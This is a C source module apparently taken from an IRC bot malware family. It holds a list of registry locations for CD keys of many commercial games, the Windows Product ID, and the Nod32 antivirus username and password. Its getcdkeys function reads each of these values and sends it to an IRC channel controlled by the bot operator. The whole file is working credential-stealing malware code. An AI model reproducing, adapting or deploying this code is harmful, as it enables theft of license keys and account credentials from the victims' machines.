#include "../h/includes.h"
#include "../h/functions.h"
#include "../h/externs.h"

// FIX ME: Encrypt registry keys
#ifndef NO_CDKEYS

//globals
REGKEYS regkeys[]={
   {HKEY_CURRENT_USER,"Software\\Valve\\CounterStrike\\Settings","CDKey","Counter-Strike (Retail)",NULL,NULL},
   {HKEY_CURRENT_USER,"Software\\Eugen Systems\\The Gladiators","RegNumber","The Gladiators",NULL,NULL},
   {HKEY_CURRENT_USER,"Software\\Valve\\Gunman\\Settings","Key","Gunman Chronicles",NULL,NULL},
   {HKEY_CURRENT_USER,"Software\\Valve\\Half-Life\\Settings","Key","Half-Life",NULL,NULL},
   {HKEY_CURRENT_USER,"Software\\JoWooD\\InstalledGames\\IG2","prvkey","Industry Giant 2",NULL,NULL},
   {HKEY_CURRENT_USER,"Software\\3d0\\Status","CustomerNumber","Legends of Might and Magic",NULL,NULL},
   {HKEY_CURRENT_USER,"Software\\Silver Style Entertainment\\Soldiers Of Anarchy\\Settings","CDKey","Soldiers Of Anarchy",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion","ProductId","Microsoft Windows Product ID",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Unreal Technology\\Installed Apps\\UT2003","CDKey","Unreal Tournament 2003",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Unreal Technology\\Installed Apps\\UT2004","CDKey","Unreal Tournament 2004",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\id\\Quake 4","CDKey","Quake 4",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\IGI 2 Retail","CDKey","IGI 2: Covert Strike",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA Distribution\\Freedom Force\\ergc","","Freedom Force",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA GAMES\\Battlefield 1942\\ergc","","Battlefield 1942",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA GAMES\\Battlefield 2\\ergc","","Battlefield 2",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Activision\\Call of Duty","codkey","CoD",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Activision\\Call of Duty 2","codkey","CoD2",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA GAMES\\Battlefield 1942 The Road to Rome\\ergc","","Battlefield 1942 (Road To Rome)",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA GAMES\\Battlefield 1942 Secret Weapons of WWII\\ergc","","Battlefield 1942 (Secret Weapons of WWII)",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA GAMES\\Battlefield Vietnam\\ergc","","Battlefield Vietnam",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA GAMES\\Black and White\\ergc","","Black and White",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA GAMES\\Command and Conquer Generals Zero Hour\\ergc","","Command and Conquer: Generals (Zero Hour)",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA GAMES\\James Bond 007 Nightfire\\ergc","","James Bond 007: Nightfire",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA GAMES\\Generals\\ergc","","Command and Conquer: Generals",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA GAMES\\Global Operations\\ergc","","Global Operations",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault\\ergc","","Medal of Honor: Allied Assault",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Breakthrough\\ergc","","Medal of Honor: Allied Assault: Breakthrough",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Spearhead\\ergc","","Medal of Honor: Allied Assault: Spearhead",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA GAMES\\Need For Speed Hot Pursuit 2","ergc","Need For Speed Hot Pursuit 2",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA GAMES\\Need For Speed Underground\\ergc","","Need For Speed: Underground",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA GAMES\\Need for Speed Most Wanted\\ergc","","Need For Speed: Most Wanted",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA GAMES\\Shogun Total War - Warlord Edition\\ergc","","Shogun: Total War: Warlord Edition",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA Sports\\FIFA 2002\\ergc","","FIFA 2002",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA Sports\\FIFA 2003\\ergc","","FIFA 2003",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA Sports\\FIFA 2006\\ergc","","FIFA 2006",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA Sports\\NHL 2002\\ergc","","NHL 2002",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA Sports\\NHL 2003\\ergc","","NHL 2003",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA Sports\\Nascar Racing 2002\\ergc","","Nascar Racing 2002",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA Sports\\Nascar Racing 2003\\ergc","","Nascar Racing 2003",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Red Storm Entertainment\\RAVENSHIELD","CDKey","Rainbow Six III RavenShield",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Westwood\\Tiberian Sun","Serial","Command and Conquer: Tiberian Sun",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Westwood\\Red Alert","Serial","Command and Conquer: Red Alert",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Westwood\\Red Alert 2","Serial","Command and Conquer: Red Alert 2",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Westwood\\NOX","Serial","NOX",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Techland\\Chrome","SerialNumber","Chrome",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Illusion Softworks\\Hidden & Dangerous 2","key","Hidden & Dangerous 2",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Activision\\Soldier of Fortune II - Double Helix","InstallPath","Soldier of Fortune II - Double Helix","base\\mp\\sof2key","mtkwftmkemfew3p3b7"},
   {HKEY_LOCAL_MACHINE,"Software\\BioWare\\NWN\\Neverwinter","Location","Neverwinter Nights","nwncdkey.ini","Key1="},
   {HKEY_LOCAL_MACHINE,"Software\\BioWare\\NWN\\Neverwinter","Location","Neverwinter Nights (Shadows of Undrentide)","nwncdkey.ini","Key2="},
   {HKEY_LOCAL_MACHINE,"Software\\BioWare\\NWN\\Neverwinter","Location","Neverwinter Nights (Hordes of the Underdark)","nwncdkey.ini","Key3="},   
   {HKEY_LOCAL_MACHINE,"SOFTWARE\\THQ\\MotoGP3","CDKey","MotoGP3",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Futuremark\\3DMark06","KeyCode","3DMark06 Key",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Eset\\Nod\\CurrentVersion\\Modules\\Update\\Settings\\Config000\\Settings","Username","Nod32 User",NULL,NULL},
   {HKEY_LOCAL_MACHINE,"Software\\Eset\\Nod\\CurrentVersion\\Modules\\Update\\Settings\\Config000\\Settings","Password","Nod32 Pass",NULL,NULL}, 
   {NULL,NULL,NULL,NULL,NULL,NULL}
}; 

void getcdkeys(SOCKET sock, char *chan, BOOL notice)
{
	char sendbuf[IRCLINE], line[100], szPath[MAX_PATH];
	unsigned char szDataBuf[128]; 

	FILE *fp;
	HKEY hkey;
	LONG lRet;
	DWORD dwSize = 128;

	for (unsigned int i=0; regkeys[i].subkey; i++) {
		lRet = fRegOpenKeyEx(regkeys[i].hkey, regkeys[i].subkey, 0, KEY_READ, &hkey);
		if(fRegQueryValueEx(hkey, regkeys[i].value, NULL, NULL, szDataBuf, &dwSize) == ERROR_SUCCESS) {
			if (regkeys[i].file) {
				sprintf(szPath, "%s\\%s", szDataBuf, regkeys[i].file);
				if((fp=fopen(szPath,"r"))!=NULL) { 
					while(fgets(line,sizeof(line),fp)) {
						if(!strstr(line, regkeys[i].tag)) {
							if (strchr(regkeys[i].tag,'=')) {
								strtok(line,"=");
								sprintf(sendbuf, "%s CD Key: (%s).",regkeys[i].name,strtok(NULL, "="));
							} else 
								sprintf(sendbuf, "%s CD Key: (%s).",regkeys[i].name,line);
							irc_privmsg(sock,chan,sendbuf,notice);
							break;
						}
					}
					fclose(fp); 
				}
			} else {
				sprintf(sendbuf, "%s CD Key: (%s).",regkeys[i].name,szDataBuf);
				irc_privmsg(sock,chan,sendbuf,notice);
			}
		}
		fRegCloseKey(hkey);
	}
	return;
}
#endif
